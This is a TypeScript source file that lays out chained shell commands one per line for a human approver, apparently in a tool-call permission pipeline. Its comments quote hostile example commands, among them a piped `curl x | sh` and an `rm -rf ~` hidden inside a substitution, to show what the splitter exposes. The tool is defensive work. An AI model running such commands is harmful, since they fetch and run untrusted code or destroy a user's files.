/**
 * Shows a shell command the way an approver should read it: one command per line, with the operator that chains it
 * in front, and the spaces outside quotes and substitutions normalised. `git status && curl x | sh` reads as three
 * lines, so a second command can't hide at the end of a long first one. It only lays the text out; the permission
 * pipeline decides. The text it returns may still hold control characters, so a caller that prints it passes it
 * through `visible()` first.
 */

const OPERATORS = ["&&", "||", ";;", ";", "|&", "|", "&", "\n"] as const;

/** One command of a chain, with the operator that joins it to the one before (empty for the first). */
export interface ChainedCommand {
  readonly operator: string;
  readonly command: string;
  /**
   * Set on the last command when the text ends inside a quote or a parenthesis the scan never saw closed, such as a
   * here-document's `it's`. The shell may read that text differently, so the split before it can't be trusted.
   */
  readonly unclosed?: true;
}

/**
 * The words of `text` outside quotes and substitutions joined by single spaces. Quoted text, backticks and the inside
 * of `$(...)` and `(...)` are kept as written, line breaks included, because the shell runs a line break there as a
 * separate command: collapsing it would show `echo $(id\nrm -rf ~)` as one command. A backslash outside single quotes
 * is kept with the character after it, so `foo\ bar` keeps its escaped space and `"a\"b"` stays one quoted word. Only
 * a space or a tab is a blank, as it is to the shell: a no-break space is part of a word and is kept.
 */
function normalised(text: string): string {
  let out = "";
  const scan = newScan();
  let space = false;
  // No trim: leading and trailing spaces are dropped by the loop, and an escaped trailing space is kept.
  for (let at = 0; at < text.length; ) {
    const token = tokenAt(text, at, scan.open.at(-1));
    at += token.length;
    if (outside(scan) && (token === " " || token === "\t")) {
      space = true;
      continue;
    }
    if (space && out !== "") out += " ";
    space = false;
    out += token;
    if (token.length === 1) step(scan, token);
    else stepEscaped(scan);
  }
  return out;
}

/**
 * The text at `at` that stays together: a backslash outside single quotes with the character it escapes,
 * or one character.
 */
const tokenAt = (text: string, at: number, quote: string | undefined): string =>
  text[at] === "\\" && quote !== "'" ? text.slice(at, at + 2) : (text[at] as string);

/**
 * The operator that starts at `at` outside quotes, or `undefined`. `afterRedirect` says the character before is an
 * unescaped `<` or `>`, so the `&` of `2>&1` or `<&3` and the `|` of `>|` belong to a redirection, as does the `&` of
 * `&>` and `&>>`; none of them ends a command.
 */
function operatorAt(text: string, at: number, afterRedirect: boolean): string | undefined {
  const found = OPERATORS.find((operator) => text.startsWith(operator, at));
  if (found === "&" && (afterRedirect || text[at + 1] === ">")) return undefined;
  if (found === "|" && afterRedirect) return undefined;
  return found;
}

/**
 * Where the scan of a command stands: the quotes and parentheses it is inside, innermost last, and the character it
 * read last, which is empty after an escape. Inside double quotes, `$(` opens a substitution whose own quotes nest, as
 * in the shell: `"$(echo '"')"` is one word, and a flat scan would read its inner `"` as the end of the outer quote.
 */
interface Scan {
  readonly open: string[];
  last: string;
}

const newScan = (): Scan => ({ open: [], last: "" });

/** Whether the scan is outside every quote and parenthesis. */
const outside = (scan: Scan): boolean => scan.open.length === 0;

/** Whether the scan is inside a quote, rather than in a parenthesis or outside. */
const quoted = (scan: Scan): boolean => ['"', "'", "`"].includes(scan.open.at(-1) ?? "");

/** Moves the scan past `char` inside double quotes, where only `"`, a backtick and `$(` open or close anything. */
function stepDoubleQuoted(scan: Scan, char: string, last: string): void {
  if (char === '"') scan.open.pop();
  else if (char === "`" || (char === "(" && last === "$")) scan.open.push(char);
}

/** Moves the scan past `char` outside quotes, and says whether `char` is outside every parenthesis too. */
function stepUnquoted(scan: Scan, char: string): boolean {
  if (char === '"' || char === "'" || char === "`" || char === "(") scan.open.push(char);
  else if (char === ")") {
    if (scan.open.at(-1) === "(") scan.open.pop();
  } else return outside(scan);
  return false;
}

/** Moves the scan past `char`, and says whether `char` is outside every quote and parenthesis. */
function step(scan: Scan, char: string): boolean {
  const last = scan.last;
  scan.last = char;
  const inner = scan.open.at(-1);
  if (inner === "'" || inner === "`") {
    if (char === inner) scan.open.pop();
    return false;
  }
  if (inner === '"') {
    stepDoubleQuoted(scan, char, last);
    return false;
  }
  return stepUnquoted(scan, char);
}

/** Moves the scan past a character a backslash escaped, which is a plain character and opens or closes nothing. */
function stepEscaped(scan: Scan): void {
  scan.last = "";
}

/**
 * Whether a comment starts at `at`: an unquoted `#` that starts a word, not one inside a word such as `$#` or `a#b`.
 * `escaped` is the index of the last character a backslash escaped, which is part of a word.
 */
const startsComment = (command: string, at: number, scan: Scan, escaped: number): boolean =>
  !quoted(scan) &&
  command[at] === "#" &&
  (at === 0 || (escaped !== at - 1 && " \t\n;&|()".includes(command[at - 1] as string)));

/** The index just before the line break that ends the comment at `at`, which the next pass reads as an operator. */
function commentEnd(command: string, at: number): number {
  const end = command.indexOf("\n", at);
  return (end < 0 ? command.length : end) - 1;
}

/** Whether the character before `at` is an unescaped `<` or `>`, so what starts at `at` belongs to a redirection. */
const afterRedirect = (command: string, at: number, escaped: number): boolean =>
  at > 0 && escaped !== at - 1 && (command[at - 1] === ">" || command[at - 1] === "<");

/**
 * Splits `command` at its list and pipe operators outside quotes, escapes, substitutions and comments. A comment runs
 * to the end of its line, and a quote inside it opens nothing, as in the shell: otherwise the `'` of `# it's` would
 * hide the commands on the lines after it inside one displayed line.
 */
export function chainedCommands(command: string): ChainedCommand[] {
  const parts: ChainedCommand[] = [];
  const scan = newScan();
  let operator = "";
  let start = 0;
  const close = (end: number, next: string) => {
    const text = normalised(command.slice(start, end));
    if (text !== "") parts.push({ operator, command: text });
    operator = next;
  };
  // The index of the last character a backslash escaped, which is a plain character and never a redirection.
  let escaped = -1;
  for (let at = 0; at < command.length; at++) {
    const char = command[at] as string;
    if (char === "\\" && scan.open.at(-1) !== "'") {
      at += 1;
      escaped = at;
      stepEscaped(scan);
      continue;
    }
    if (startsComment(command, at, scan, escaped)) {
      at = commentEnd(command, at);
      scan.last = "";
      continue;
    }
    const found = step(scan, char) ? operatorAt(command, at, afterRedirect(command, at, escaped)) : undefined;
    if (found === undefined) continue;
    close(at, found === "\n" ? ";" : found);
    at += found.length - 1;
    start = at + 1;
  }
  close(command.length, "");
  const last = parts.at(-1);
  if (last !== undefined && !outside(scan)) parts[parts.length - 1] = { ...last, unclosed: true };
  return parts;
}

/** The command a tool call's input carries in its `command` field, when it has one. */
export function commandOf(input: unknown): string | undefined {
  if (typeof input !== "object" || input === null) return undefined;
  const command = (input as { command?: unknown }).command;
  return typeof command === "string" ? command : undefined;
}
